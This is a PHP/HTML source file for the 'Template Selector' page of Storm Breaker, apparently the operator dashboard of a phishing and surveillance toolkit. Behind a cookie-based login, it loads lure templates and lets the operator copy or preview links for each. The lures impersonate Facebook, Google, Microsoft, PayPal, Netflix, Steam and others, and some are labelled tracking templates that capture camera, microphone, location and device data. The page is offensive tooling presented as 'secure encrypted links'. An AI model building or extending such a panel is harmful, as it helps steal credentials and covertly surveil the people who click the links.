<?php
session_start();
include "./assets/components/login-arc.php";

if(isset($_COOKIE['logindata']) && $_COOKIE['logindata'] == $key['token'] && $key['expired'] == "no"){
    if(!isset($_SESSION['IAm-logined'])){
        $_SESSION['IAm-logined'] = 'yes';
    }
}
elseif(isset($_SESSION['IAm-logined'])){
    $client_token = generate_token();
    setcookie("logindata", $client_token, time() + (86400 * 30), "/");
    change_token($client_token);
}
else {
    header('location: login-v4.php');
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Template Selector - Storm Breaker</title>
    <link href="./assets/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container-fluid {
            max-width: 1400px;
            margin: 0 auto;
        }
        .header {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 25px 35px;
            margin-bottom: 30px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.15);
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
        }
        .header h1 {
            color: #667eea;
            font-size: 2.2rem;
            font-weight: 700;
            margin: 0;
        }
        .header .subtitle {
            color: #666;
            font-size: 0.95rem;
            margin-top: 5px;
        }
        .btn-back {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 10px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }
        .btn-back:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
            color: white;
        }
        .search-bar {
            background: white;
            border-radius: 15px;
            padding: 20px;
            margin-bottom: 25px;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
        }
        .search-bar input {
            width: 100%;
            padding: 15px 20px;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 1rem;
            transition: all 0.3s ease;
        }
        .search-bar input:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }
        .filter-buttons {
            display: flex;
            gap: 10px;
            margin-top: 15px;
            flex-wrap: wrap;
        }
        .filter-btn {
            padding: 8px 20px;
            border: 2px solid #667eea;
            background: white;
            color: #667eea;
            border-radius: 25px;
            cursor: pointer;
            transition: all 0.3s ease;
            font-weight: 600;
            font-size: 0.9rem;
        }
        .filter-btn:hover, .filter-btn.active {
            background: #667eea;
            color: white;
        }
        .templates-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
            gap: 25px;
            margin-bottom: 30px;
        }
        .template-card {
            background: white;
            border-radius: 20px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            transition: all 0.3s ease;
            cursor: pointer;
            position: relative;
        }
        .template-card:hover {
            transform: translateY(-10px);
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.2);
        }
        .template-icon {
            height: 120px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 3.5rem;
            color: white;
            position: relative;
            overflow: hidden;
        }
        .template-icon::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent);
            transform: rotate(45deg);
            transition: all 0.6s ease;
        }
        .template-card:hover .template-icon::before {
            left: 100%;
        }
        .template-body {
            padding: 25px;
        }
        .template-body h3 {
            color: #333;
            font-size: 1.4rem;
            margin-bottom: 10px;
            font-weight: 700;
        }
        .template-body p {
            color: #666;
            font-size: 0.95rem;
            margin-bottom: 20px;
            line-height: 1.6;
        }
        .template-actions {
            display: flex;
            gap: 10px;
        }
        .btn-action {
            flex: 1;
            padding: 12px;
            border: none;
            border-radius: 10px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        .btn-copy {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        .btn-copy:hover {
            transform: scale(1.05);
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
        }
        .btn-preview {
            background: #f8f9fa;
            color: #333;
        }
        .btn-preview:hover {
            background: #e9ecef;
        }
        .copied-badge {
            position: absolute;
            top: 15px;
            right: 15px;
            background: #2ecc71;
            color: white;
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 0.85rem;
            font-weight: 600;
            opacity: 0;
            transform: scale(0.8);
            transition: all 0.3s ease;
        }
        .copied-badge.show {
            opacity: 1;
            transform: scale(1);
        }
        .url-preview {
            background: #f8f9fa;
            padding: 12px;
            border-radius: 8px;
            margin-top: 15px;
            font-family: 'Courier New', monospace;
            font-size: 0.85rem;
            color: #666;
            word-break: break-all;
            border: 1px dashed #ddd;
        }
        .category-badge {
            position: absolute;
            top: 15px;
            left: 15px;
            background: rgba(255, 255, 255, 0.9);
            padding: 5px 12px;
            border-radius: 15px;
            font-size: 0.8rem;
            font-weight: 600;
            color: #667eea;
        }
        .loading {
            text-align: center;
            padding: 50px;
            color: white;
            font-size: 1.2rem;
        }
        .no-results {
            text-align: center;
            padding: 50px;
            background: white;
            border-radius: 20px;
            color: #666;
        }
        .no-results i {
            font-size: 4rem;
            color: #ddd;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container-fluid">
        <div class="header">
            <div>
                <h1><i class="fas fa-link"></i> Template Selector</h1>
                <div class="subtitle">Generate secure encrypted links for your templates</div>
            </div>
            <a href="panel-v5.php" class="btn-back">
                <i class="fas fa-arrow-left"></i> Back to Dashboard
            </a>
        </div>

        <div class="search-bar">
            <input type="text" id="searchInput" placeholder="🔍 Search templates..." />
            <div class="filter-buttons">
                <button class="filter-btn active" data-category="all">All Templates</button>
                <button class="filter-btn" data-category="social">Social Media</button>
                <button class="filter-btn" data-category="payment">Payment</button>
                <button class="filter-btn" data-category="tracking">Tracking</button>
                <button class="filter-btn" data-category="media">Media</button>
                <button class="filter-btn" data-category="other">Other</button>
            </div>
        </div>

        <div class="templates-grid" id="templatesGrid">
            <div class="loading">
                <i class="fas fa-spinner fa-spin"></i> Loading templates...
            </div>
        </div>
    </div>

    <script src="./assets/js/jquery.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script>
        const templateCategories = {
            'facebook': 'social',
            'twitter': 'social',
            'discord': 'social',
            'google': 'social',
            'microsoft': 'social',
            'netflix': 'media',
            'spotify': 'media',
            'steam': 'media',
            'paypal': 'payment',
            'advanced_location': 'tracking',
            'location': 'tracking',
            'camera': 'tracking',
            'microphone': 'tracking',
            'device_info': 'tracking',
            'weather': 'other',
            'data_capture': 'other'
        };

        const templateGradients = {
            'facebook': 'linear-gradient(135deg, #1877f2 0%, #166fe5 100%)',
            'twitter': 'linear-gradient(135deg, #1d9bf0 0%, #0c8bd9 100%)',
            'discord': 'linear-gradient(135deg, #5865f2 0%, #4752c4 100%)',
            'google': 'linear-gradient(135deg, #ea4335 0%, #d23321 100%)',
            'microsoft': 'linear-gradient(135deg, #00a4ef 0%, #0078d4 100%)',
            'netflix': 'linear-gradient(135deg, #e50914 0%, #b20710 100%)',
            'spotify': 'linear-gradient(135deg, #1db954 0%, #1ed760 100%)',
            'steam': 'linear-gradient(135deg, #171a21 0%, #1b2838 100%)',
            'paypal': 'linear-gradient(135deg, #0070ba 0%, #005ea6 100%)',
            'advanced_location': 'linear-gradient(135deg, #e74c3c 0%, #c0392b 100%)',
            'location': 'linear-gradient(135deg, #27ae60 0%, #229954 100%)',
            'camera': 'linear-gradient(135deg, #3498db 0%, #2980b9 100%)',
            'microphone': 'linear-gradient(135deg, #e67e22 0%, #d35400 100%)',
            'device_info': 'linear-gradient(135deg, #9b59b6 0%, #8e44ad 100%)',
            'weather': 'linear-gradient(135deg, #f39c12 0%, #e67e22 100%)',
            'data_capture': 'linear-gradient(135deg, #34495e 0%, #2c3e50 100%)'
        };

        let allTemplates = [];
        let currentFilter = 'all';

        // Load templates
        $.get('generate_links.php', function(response) {
            if (response.success) {
                allTemplates = response.templates;
                renderTemplates(allTemplates);
            }
        });

        function renderTemplates(templates) {
            const grid = $('#templatesGrid');
            grid.empty();

            const filtered = Object.keys(templates).filter(key => {
                const category = templateCategories[key] || 'other';
                return currentFilter === 'all' || category === currentFilter;
            });

            if (filtered.length === 0) {
                grid.html('<div class="no-results"><i class="fas fa-search"></i><h3>No templates found</h3><p>Try adjusting your search or filter</p></div>');
                return;
            }

            filtered.forEach(key => {
                const template = templates[key];
                const gradient = templateGradients[key] || 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)';
                const category = templateCategories[key] || 'other';

                const card = `
                    <div class="template-card" data-key="${key}" data-category="${category}">
                        <div class="copied-badge">✓ Copied!</div>
                        <div class="category-badge">${category}</div>
                        <div class="template-icon" style="background: ${gradient}">
                            <i class="${template.icon}"></i>
                        </div>
                        <div class="template-body">
                            <h3>${template.name}</h3>
                            <p>${template.desc}</p>
                            <div class="template-actions">
                                <button class="btn-action btn-copy" onclick="copyLink('${key}', '${template.url}')">
                                    <i class="fas fa-copy"></i> Copy Link
                                </button>
                                <button class="btn-action btn-preview" onclick="previewLink('${template.url}')">
                                    <i class="fas fa-eye"></i> Preview
                                </button>
                            </div>
                            <div class="url-preview">${template.url}</div>
                        </div>
                    </div>
                `;
                grid.append(card);
            });
        }

        function copyLink(key, url) {
            navigator.clipboard.writeText(url).then(() => {
                const card = $(`.template-card[data-key="${key}"]`);
                const badge = card.find('.copied-badge');
                badge.addClass('show');
                setTimeout(() => badge.removeClass('show'), 2000);

                Swal.fire({
                    icon: 'success',
                    title: 'Link Copied!',
                    text: 'Encrypted link has been copied to clipboard',
                    timer: 2000,
                    showConfirmButton: false
                });
            });
        }

        function previewLink(url) {
            Swal.fire({
                title: 'Preview Link',
                html: `<div style="text-align: left; word-break: break-all; background: #f8f9fa; padding: 15px; border-radius: 10px; font-family: monospace;">${url}</div>`,
                icon: 'info',
                showCancelButton: true,
                confirmButtonText: 'Open Link',
                cancelButtonText: 'Close'
            }).then((result) => {
                if (result.isConfirmed) {
                    window.open(url, '_blank');
                }
            });
        }

        // Filter buttons
        $('.filter-btn').click(function() {
            $('.filter-btn').removeClass('active');
            $(this).addClass('active');
            currentFilter = $(this).data('category');
            renderTemplates(allTemplates);
        });

        // Search functionality
        $('#searchInput').on('input', function() {
            const searchTerm = $(this).val().toLowerCase();
            $('.template-card').each(function() {
                const text = $(this).text().toLowerCase();
                $(this).toggle(text.includes(searchTerm));
            });
        });
    </script>
</body>
</html>
